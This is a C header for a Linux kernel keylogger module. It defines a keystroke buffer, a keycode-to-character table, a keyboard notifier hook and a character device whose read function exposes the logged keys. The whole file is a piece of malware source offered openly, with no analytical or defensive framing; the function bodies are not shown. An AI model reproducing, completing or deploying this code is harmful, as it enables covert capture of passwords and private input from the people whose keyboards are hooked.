#ifndef KEY_LOGGER_H
#define KEY_LOGGER_H

#include <linux/fs.h>
#include <linux/types.h>
#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/input.h>

#define KLG_MAJOR   60
#define BUFF_LENGTH 1024
#define FIRST_CD    KEY_1
#define LAST_CD     KEY_SLASH

char buffer[BUFF_LENGTH+1];
char* bptr = buffer;
const char* endptr = (buffer+sizeof(buffer)-1);
const char ch_table[] = {'1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '\r',
		   '\t', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n',
		   'X', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', 'X',
		   'X', '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/'};

inline char get_ascii(int code) {
	if((code < FIRST_CD || code > LAST_CD) && code != KEY_SPACE) return 'X';
	else if(code == KEY_SPACE) return ' ';
	
	return ch_table[(code-FIRST_CD)];
}

int klg_open(struct inode *inode, struct file *filp);
ssize_t klg_read(struct file *filp, char *buf, size_t count, loff_t *f_pos);
void klg_exit(void);
int klg_init(void);
int kbd_notifier(struct notifier_block* nblock, unsigned long code, void* param);

struct file_operations klg_fops = {
  .owner = THIS_MODULE,
  .read = klg_read,
  .open = klg_open
};

struct notifier_block nb = {
  .notifier_call = kbd_notifier
};

#endif
